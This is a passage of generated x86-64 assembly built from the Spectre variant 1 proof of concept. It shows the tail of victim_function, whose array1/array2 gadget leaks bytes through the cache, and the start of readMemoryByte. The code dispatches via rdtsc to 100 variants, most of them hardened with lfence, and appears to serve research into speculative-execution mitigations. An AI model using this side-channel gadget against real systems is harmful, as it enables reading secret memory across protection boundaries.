## Variant 74
.Lvictim_function_win0_var74:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 75
.Lvictim_function_win0_var75:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 76
.Lvictim_function_win0_var76:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 77
.Lvictim_function_win0_var77:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 78
.Lvictim_function_win0_var78:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 79
.Lvictim_function_win0_var79:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 80
.Lvictim_function_win0_var80:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 81
.Lvictim_function_win0_var81:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 82
.Lvictim_function_win0_var82:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 83
.Lvictim_function_win0_var83:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 84
.Lvictim_function_win0_var84:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 85
.Lvictim_function_win0_var85:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 86
.Lvictim_function_win0_var86:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 87
.Lvictim_function_win0_var87:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 88
.Lvictim_function_win0_var88:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 89
.Lvictim_function_win0_var89:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 90
.Lvictim_function_win0_var90:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 91
.Lvictim_function_win0_var91:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 92
.Lvictim_function_win0_var92:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 93
.Lvictim_function_win0_var93:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 94
.Lvictim_function_win0_var94:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 95
.Lvictim_function_win0_var95:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 96
.Lvictim_function_win0_var96:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 97
.Lvictim_function_win0_var97:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 98
.Lvictim_function_win0_var98:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 99
.Lvictim_function_win0_var99:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
.Lvictim_function_win0_continue:
	addq	$32, %rsp
	movzbl	%al, %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdx), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
.L3:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4379:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4380:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%r12
	pushq	%rbx
	addq	$-128, %rsp
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	movl	%edi, -116(%rbp)
	movq	%rsi, -128(%rbp)
	movq	%rdx, -136(%rbp)
	movq	%rcx, -144(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -108(%rbp)
	movl	$0, -96(%rbp)
	jmp	.L5
.L6:
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	$0, (%rdx,%rax)
	addl	$1, -96(%rbp)
.L5:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win11_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win11_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win11_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win11_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win11_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win11_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win11_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win11_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win11_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win11_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win11_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win11_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win11_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win11_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win11_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win11_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win11_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win11_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win11_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win11_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win11_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win11_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win11_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win11_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win11_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win11_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win11_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win11_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win11_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win11_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win11_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win11_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win11_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win11_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win11_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win11_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win11_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win11_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win11_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win11_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win11_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win11_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win11_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win11_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win11_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win11_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win11_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win11_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win11_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win11_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win11_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win11_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win11_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win11_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win11_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win11_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win11_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win11_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win11_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win11_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win11_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win11_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win11_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win11_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win11_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win11_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win11_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win11_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win11_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win11_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win11_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win11_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win11_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win11_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win11_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win11_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win11_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win11_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win11_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win11_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win11_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win11_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win11_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win11_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win11_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win11_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win11_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win11_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win11_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win11_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win11_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win11_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win11_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win11_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win11_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win11_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win11_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win11_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win11_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win11_var99
	jmp	.LreadMemoryByte_win11_var0
## Variant 0
.LreadMemoryByte_win11_var0:
	popq	%rax
	cmpl	$255, -96(%rbp)
	jle	.L6
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 1
.LreadMemoryByte_win11_var1:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 2
.LreadMemoryByte_win11_var2:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 3
.LreadMemoryByte_win11_var3:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 4
.LreadMemoryByte_win11_var4:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 5
.LreadMemoryByte_win11_var5:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 6
.LreadMemoryByte_win11_var6:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 7
.LreadMemoryByte_win11_var7:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 8
.LreadMemoryByte_win11_var8:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 9
.LreadMemoryByte_win11_var9:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 10
.LreadMemoryByte_win11_var10:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 11
.LreadMemoryByte_win11_var11:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 12
.LreadMemoryByte_win11_var12:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 13
.LreadMemoryByte_win11_var13:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 14
.LreadMemoryByte_win11_var14:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 15
.LreadMemoryByte_win11_var15:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 16
.LreadMemoryByte_win11_var16:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 17
.LreadMemoryByte_win11_var17:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 18
.LreadMemoryByte_win11_var18:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 19
.LreadMemoryByte_win11_var19:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 20
.LreadMemoryByte_win11_var20:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 21
.LreadMemoryByte_win11_var21:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 22
.LreadMemoryByte_win11_var22:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 23
.LreadMemoryByte_win11_var23:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 24
.LreadMemoryByte_win11_var24:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 25
.LreadMemoryByte_win11_var25:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 26
.LreadMemoryByte_win11_var26:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 27
.LreadMemoryByte_win11_var27:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 28
.LreadMemoryByte_win11_var28:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 29
.LreadMemoryByte_win11_var29:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 30
.LreadMemoryByte_win11_var30:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 31
.LreadMemoryByte_win11_var31:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 32
.LreadMemoryByte_win11_var32:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 33
.LreadMemoryByte_win11_var33:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 34
.LreadMemoryByte_win11_var34:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 35
.LreadMemoryByte_win11_var35:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 36
.LreadMemoryByte_win11_var36:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 37
.LreadMemoryByte_win11_var37:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 38
.LreadMemoryByte_win11_var38:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 39
.LreadMemoryByte_win11_var39:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 40
.LreadMemoryByte_win11_var40:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 41
.LreadMemoryByte_win11_var41:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 42
.LreadMemoryByte_win11_var42:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 43
.LreadMemoryByte_win11_var43:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 44
.LreadMemoryByte_win11_var44:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 45
.LreadMemoryByte_win11_var45:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 46
.LreadMemoryByte_win11_var46:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 47
.LreadMemoryByte_win11_var47:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 48
.LreadMemoryByte_win11_var48:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 49
.LreadMemoryByte_win11_var49:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 50
.LreadMemoryByte_win11_var50:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 51
.LreadMemoryByte_win11_var51:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 52
.LreadMemoryByte_win11_var52:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 53
.LreadMemoryByte_win11_var53:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 54
.LreadMemoryByte_win11_var54:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 55
.LreadMemoryByte_win11_var55:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 56
.LreadMemoryByte_win11_var56:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 57
.LreadMemoryByte_win11_var57:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 58
.LreadMemoryByte_win11_var58:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 59
.LreadMemoryByte_win11_var59:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 60
.LreadMemoryByte_win11_var60:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 61
.LreadMemoryByte_win11_var61:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 62
.LreadMemoryByte_win11_var62:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 63
.LreadMemoryByte_win11_var63:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 64
.LreadMemoryByte_win11_var64:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
